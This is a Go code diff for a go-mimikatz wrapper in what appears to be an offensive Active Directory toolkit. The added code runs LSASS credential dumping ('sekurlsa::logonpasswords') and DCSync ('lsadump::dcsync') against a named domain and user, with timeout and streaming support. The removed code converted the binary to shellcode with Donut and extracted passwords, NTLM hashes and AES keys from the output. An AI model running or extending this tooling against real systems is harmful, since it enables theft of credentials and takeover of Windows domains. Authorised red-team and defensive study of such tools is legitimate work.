@@ -2,10 +2,8 @@ package tools
 
 import (
 	"adpack/utils"
+	"context"
 	"fmt"
-	"os"
-	"os/exec"
-	"strings"
 	"time"
 )
 
@@ -16,11 +14,22 @@ var GoMimikatz = goMimikatzTool{}
 func (goMimikatzTool) Name() string    { return "go-mimikatz" }
 func (goMimikatzTool) Available() bool { return utils.ToolAvailable("go-mimikatz") }
 
+func (goMimikatzTool) Validate() error {
+	if !GoMimikatz.Available() {
+		return &ToolError{Tool: "go-mimikatz", Op: "validate", Err: fmt.Errorf("go-mimikatz not found")}
+	}
+	return nil
+}
+
+func (goMimikatzTool) Capabilities() []Capability {
+	return []Capability{CapLSASSDump, CapDCSync}
+}
+
 type GoMimikatzConfig struct {
 	Binary     string
-	Command    string // e.g. "sekurlsa::logonpasswords"
+	Command    string
 	OutputFile string
-	Timeout    int // seconds
+	Timeout    int
 }
 
 func DefaultGoMimikatzConfig() GoMimikatzConfig {
@@ -31,88 +40,56 @@ func DefaultGoMimikatzConfig() GoMimikatzConfig {
 	}
 }
 
-func (g goMimikatzTool) Run(cfg GoMimikatzConfig) utils.CmdResult {
+func (g goMimikatzTool) Run(ctx context.Context, req ExecutionRequest) (*ExecutionResult, error) {
+	return g.Sekurlsa(ctx, req)
+}
+
+func (g goMimikatzTool) RunStream(ctx context.Context, req ExecutionRequest) (<-chan ExecutionEvent, error) {
+	ch := make(chan ExecutionEvent, 1)
+	go func() {
+		defer close(ch)
+		result, err := g.Run(ctx, req)
+		if err != nil {
+			ch <- ExecutionEvent{Type: "error", Status: StatusFailed, Error: err}
+			return
+		}
+		ch <- ExecutionEvent{Type: "complete", Status: StatusSuccess, Result: result}
+	}()
+	return ch, nil
+}
+
+func (g goMimikatzTool) Sekurlsa(ctx context.Context, req ExecutionRequest) (*ExecutionResult, error) {
+	cfg := DefaultGoMimikatzConfig()
+	if len(req.Args) > 0 {
+		cfg.Command = req.Args[0]
+	}
+	timeout := cfg.Timeout
+	if req.Timeout > 0 {
+		timeout = int(req.Timeout.Seconds())
+	}
+	execCtx, cancel := context.WithTimeout(ctx, time.Duration(timeout)*time.Second)
+	defer cancel()
 	args := []string{cfg.Command}
-	r := utils.RunCommandTimeout(
-		time.Duration(cfg.Timeout)*time.Second,
-		cfg.Binary, args,
-	)
-	return r
+	cr := utils.RunCommandCtx(execCtx, cfg.Binary, args)
+	if !cr.Success {
+		return cmdResultToExecResult(cr), &ToolError{Tool: "go-mimikatz", Op: "sekurlsa", ExitCode: cr.ExitCode, Err: fmt.Errorf("%s", cr.Stderr)}
+	}
+	return cmdResultToExecResult(cr), nil
 }
 
-func (g goMimikatzTool) Sekurlsa(cfg GoMimikatzConfig) utils.CmdResult {
-	cfg.Command = "sekurlsa::logonpasswords"
-	return g.Run(cfg)
-}
-
-func (g goMimikatzTool) SekurlsaDcsync(domain, user string) utils.CmdResult {
-	r := utils.RunCommand("go-mimikatz",
+func (g goMimikatzTool) SekurlsaDcsync(ctx context.Context, req ExecutionRequest) (*ExecutionResult, error) {
+	domain := req.Env["DOMAIN"]
+	user := req.Env["USER"]
+	if domain == "" || user == "" {
+		return nil, &ToolError{Tool: "go-mimikatz", Op: "dcsync", Err: fmt.Errorf("DOMAIN and USER env required")}
+	}
+	cr := utils.RunCommandCtx(ctx, "go-mimikatz", []string{
 		"lsadump::dcsync",
 		fmt.Sprintf("/domain:%s", domain),
 		fmt.Sprintf("/user:%s", user),
-	)
-	return r
-}
-
-func (g goMimikatzTool) DonutShellcode(cfg GoMimikatzConfig, donutOutput string) error {
-	if !Donut.Available() {
-		return fmt.Errorf("go-mimikatz: donut not available, cannot convert to shellcode")
+	})
+	if !cr.Success {
+		return cmdResultToExecResult(cr), &ToolError{Tool: "go-mimikatz", Op: "dcsync", ExitCode: cr.ExitCode, Err: fmt.Errorf("%s", cr.Stderr)}
 	}
-	bin := g.binary()
-	if bin == "" {
-		return fmt.Errorf("go-mimikatz: binary not found")
-	}
-	_, err := Donut.WrapPE(bin, cfg.Command)
-	if err != nil {
-		return fmt.Errorf("go-mimikatz: donut wrapping failed: %w", err)
-	}
-	if donutOutput != "" {
-		expected := bin + ".bin"
-		input, err := os.ReadFile(expected)
-		if err != nil {
-			return fmt.Errorf("go-mimikatz: reading donut output: %w", err)
-		}
-		if err := os.WriteFile(donutOutput, input, 0644); err != nil {
-			return fmt.Errorf("go-mimikatz: writing shellcode to %s: %w", donutOutput, err)
-		}
-	}
-	return nil
-}
-
-func (g goMimikatzTool) ParseOutput(output string) []string {
-	lines := strings.Split(output, "\n")
-	var creds []string
-	for _, line := range lines {
-		lower := strings.ToLower(line)
-		if strings.Contains(lower, "username") || strings.Contains(lower, "password") ||
-			strings.Contains(lower, "domain") || strings.Contains(lower, "ntlm") ||
-			strings.Contains(lower, "aes") || strings.Contains(lower, "hash") {
-			parts := strings.SplitN(line, ":", 2)
-			if len(parts) == 2 {
-				val := strings.TrimSpace(parts[1])
-				if val != "" && val != "(null)" {
-					creds = append(creds, fmt.Sprintf("%s: %s", strings.TrimSpace(parts[0]), val))
-				}
-			}
-		}
-	}
-	return creds
-}
-
-func (g goMimikatzTool) binary() string {
-	if utils.ToolAvailable("go-mimikatz") {
-		return "go-mimikatz"
-	}
-	p, err := exec.LookPath("go-mimikatz.exe")
-	if err == nil {
-		return p
-	}
-	return ""
-}
-
-func (c GoMimikatzConfig) TimeoutSeconds() int {
-	if c.Timeout <= 0 {
-		return 90
-	}
-	return c.Timeout
+	return cmdResultToExecResult(cr), nil
 }
